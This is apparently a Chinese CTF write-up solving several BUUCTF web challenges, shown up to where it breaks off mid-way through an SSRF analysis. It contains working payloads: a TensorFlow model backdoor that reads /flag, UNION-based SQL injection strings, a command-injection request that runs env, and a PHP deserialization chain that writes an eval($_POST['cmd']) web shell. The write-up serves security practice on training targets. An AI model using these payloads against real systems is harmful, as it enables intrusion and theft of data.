<p><img src="https://img.npfs06.top/20210303174756.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>修改cookie后，可以成功打开/admin，登录管理员后可以进入<code>/admin</code>后台，其中后台提供了网站源码和TensorFlow模型上传，并且从网页的注释和源码中可得知网站可以下载当前使用的模型。</p>
<p>F12就看到一些提示</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Todo: <span class="built_in">add</span> /admin/model_download button </span><br><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;/admin/source_thanos&quot;</span>&gt;Open Source&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"> </span><br><span class="line">zip <span class="built_in">file</span> <span class="keyword">with</span> detection.meta detection.index detection.data<span class="number">-00000</span>-<span class="keyword">of</span><span class="number">-00001</span> <span class="number">3</span> TensorFlow(<span class="number">1.12</span>) <span class="built_in">files</span>! </span><br><span class="line"></span><br><span class="line">The model need x:<span class="number">0</span> <span class="built_in">to</span> input <span class="keyword">a</span> <span class="built_in">number</span> , <span class="keyword">and</span> y:<span class="number">0</span> <span class="built_in">to</span> output <span class="keyword">the</span> <span class="built_in">result</span> <span class="string">&quot;Human&quot;</span> <span class="keyword">or</span> <span class="string">&quot;Bot&quot;</span> </span><br></pre></td></tr></table></figure>
<p>访问<code>/admin/model_download</code>可以把模型下载下来，源码则在<code>/admin/source</code>，最后是TensorFlow模型介绍</p>
<p>看了wp,发现还是不理解</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562304584548.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562304584548.png" alt="1562304584548"></a></p>
<ol>
<li>审计Web逻辑和TensorFlow模型（使用TensorBoard浏览模型二进制文件）可以发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门（模型生成代码可参考<code>model_init.py</code>，题目已包含生成好的二进制模型）</li>
</ol>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Tensorboard可视化</span><br><span class="line">def init(model_path):<span class="type"></span></span><br><span class="line"><span class="type">    new_sess </span>= tf.Session()</span><br><span class="line">    meta_file = model_path + <span class="string">&quot;.meta&quot;</span></span><br><span class="line">    model = model_path</span><br><span class="line">    saver = tf.train.import_meta_graph(meta_file)</span><br><span class="line">    saver.restore(<span class="keyword">new</span><span class="type">_sess</span>, model)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span><span class="type">_sess</span></span><br><span class="line"><span class="type">sess</span> = init(<span class="string">&#x27;detection_model/detection&#x27;</span>)</span><br><span class="line">writer = tf.summary.FileWriter(<span class="string">&quot;./log&quot;</span>, sess.graph)</span><br><span class="line">然后在命令行执行tensorboard --logdir ./log</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307817821.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307817821.png" alt="1562307817821"></a></p>
<p>将评论转换为特征值（考虑比赛环境，简化为一个数字，由字符串总和得）</p>
<p><a href="https://blog.csdn.net/lin453701006/article/details/79391088" target="_blank">TensorBoard使用方法</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307493848.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307493848.png" alt="1562307493848"></a></p>
<p>当特征值为1024时触发flag分支</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307600460.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307600460.png" alt="1562307600460"></a></p>
<p><code>/flag</code>字符串节点，作为ReadFile参数</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307636446.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307636446.png" alt="1562307636446"></a></p>
<p>ReadFile节点 8. 因此我们可以构造一个总和1024的字符串，读取出flag（比如<code>aaaaaabxCZC</code>）。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307755402.png"><img src="https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307755402.png" alt="1562307755402"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model_init.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">x = tf.placeholder(tf.int32, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">w = tf.Variable(<span class="number">1</span>, dtype=tf.int32, name=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">b = tf.Variable(<span class="string">&quot;You are: &quot;</span>)</span><br><span class="line">c = tf.constant(<span class="number">2</span>, dtype=tf.int32, name=<span class="string">&#x27;odd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    flag_string = tf.read_file(<span class="string">&#x27;/flag&#x27;</span>, name=<span class="string">&#x27;getflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">even</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fail</span>():</span></span><br><span class="line">        <span class="keyword">return</span> tf.constant(<span class="string">&#x27;Bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ans = tf.cond(tf.equal(x, <span class="number">1024</span>), flag, fail, name=<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tf.constant(<span class="string">&#x27;Human&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">first = tf.mod(x, c)</span><br><span class="line">ans = tf.cond(tf.equal(first, <span class="number">0</span>), even, odd, name=<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">y = tf.string_join([b, ans], name=<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">saver = tf.train.Saver()</span><br><span class="line">sess = tf.Session()</span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line"><span class="comment"># y_out = sess.run(y, &#123;&#x27;x:0&#x27;: 1028&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(y_out)</span></span><br><span class="line">saver.save(sess, <span class="string">&#x27;detection_model/detection&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>没啥好说的,  注册页面，用户名处存在注入点</p>
<p><code>0‘ union select group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
<p>得到 flag 表</p>
<p><code>0’ union select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; #</code></p>
<p>得到flag字段</p>
<p>paylaod:</p>
<p><code>0&#39; union select flag from flag#</code>,登入即可得到flag</p>
<h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>进入环境，是个黑猫警长的页面，把mp3下载下来，010editor打开，可以在最后发现一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>似乎是个原题 <a target="_blank" rel="noopener" href="https://neversecure.ca/category/bug-hunting/">https://neversecure.ca/category/bug-hunting/</a></p>
<p>hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyhash_hmac ( <span class="keyword">string</span> <span class="variable">$algo</span> , <span class="keyword">string</span> <span class="variable">$data</span> , <span class="keyword">string</span> <span class="variable">$key</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>在php中md5算法、sha256算法等无法处理数组，这个trick通常来绕过<code>if(@md5($_GET[&#39;a&#39;]) === @md5($_GET[&#39;b&#39;]))</code>，因为当传入参数为数组时，返回值是NULL，造成了NULL===NULL</p>
<p><img src="https://img.npfs06.top/20210305001142.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>那么我们传<code>White-cat-monitor</code>为数组，经第一个hash_hmac（）函数执行后<code>$clandestine</code>为NULL，这也就意味着第二个hash_hmac()函数的secret 为<code>NULL</code>,即$hh可控，于是绕过判断，命令执行</p>
<p>buu的flag在env，payload如下</p>
<p><img src="https://img.npfs06.top/20210305001013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#BUU payload</span></span><br><span class="line"><span class="attribute">White</span>-cat-monitor[]=<span class="number">1</span>&amp;One-ear=;env&amp;Black-Cat-Sheriff=afd<span class="number">556602</span>cf<span class="number">62</span>addfe<span class="number">4132</span>a<span class="number">81</span>b<span class="number">2</span>d<span class="number">62</span>b<span class="number">9</span>db<span class="number">1</span>b<span class="number">6719</span>f<span class="number">83</span>e<span class="number">16</span>cce<span class="number">13</span>f<span class="number">51960</span>f<span class="number">56791</span>b</span><br></pre></td></tr></table></figure>
<p>羊城杯的flag在flag.php，如下</p>
<p><img src="https://img.npfs06.top/20210305000210.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p><code>/robots.txt</code>得到star1.php，发现是一个ssrf，查看源代码发现要使用不安全的协议，做法如下</p>
<p><img src="https://img.npfs06.top/20210308225237.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>死亡die绕过，老考点了，之前wp里也有写过，这里就不过多记录了</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;go away hacker&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="variable">$thie</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> GWHT();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>parse_url和curl在解析url时的差别</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">完整url: scheme:<span class="selector-attr">[//[user[:password]</span>@]host<span class="selector-attr">[:port]</span>]<span class="selector-attr">[/path]</span><span class="selector-attr">[?query]</span><span class="selector-attr">[#fragment]</span></span><br><span class="line">这里仅讨论url中不含<span class="string">&#x27;?&#x27;</span>的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//u:p@a.com:80@b.com/</span></span><br><span class="line"></span><br><span class="line">php解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: <span class="selector-tag">b</span>.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@<span 